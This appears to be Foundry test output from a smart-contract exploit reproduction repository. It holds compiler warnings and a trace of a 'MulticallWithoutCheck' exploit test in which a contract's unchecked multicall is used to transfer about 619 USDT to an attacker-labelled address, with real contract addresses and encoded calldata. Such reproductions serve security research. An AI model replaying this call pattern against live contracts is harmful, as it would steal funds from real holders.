Compiling 25 files with Solc 0.8.10
Compiling 26 files with Solc 0.8.25
Solc 0.8.10 finished in 855.01ms
Solc 0.8.25 finished in 944.07ms
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2022-10/MulticallWithoutCheck_exp.sol:26:5:
   |
26 |     IERC20 USDT = IERC20(0xc2132D05D31c914a87C6611C10748AEb04B58e8F);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:1582:1:
     |
1582 | interface USDT {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 266.49ms (171.42µs CPU time)

Ran 1 test for src/test/2022-10/MulticallWithoutCheck_exp.sol:ContractTest
[PASS] testExploit() (gas: 50766)
Logs:
  [End] Attacker USDT balance after exploit: 619.748460

Traces:
  [55566] ContractTest::testExploit()
    ├─ [7962] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::balanceOf(0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b) [staticcall]
    │   ├─ [2608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b) [delegatecall]
    │   │   └─ ← [Return] 619748460 [6.197e8]
    │   └─ ← [Return] 619748460 [6.197e8]
    ├─ [31516] 0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b::multicallWithoutCheck([Call({ target: 0xc2132D05D31c914a87C6611C10748AEb04B58e8F, callData: 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000024f09c6c, value: 0 })])
    │   ├─ [29198] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 619748460 [6.197e8])
    │   │   ├─ [28338] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 619748460 [6.197e8]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 619748460 [6.197e8])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [1462] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 619748460 [6.197e8]
    │   └─ ← [Return] 619748460 [6.197e8]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT balance after exploit", val: 619748460 [6.197e8], decimals: 6)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 271.69ms (513.22µs CPU time)

Ran 2 test suites in 272.43ms (538.18ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
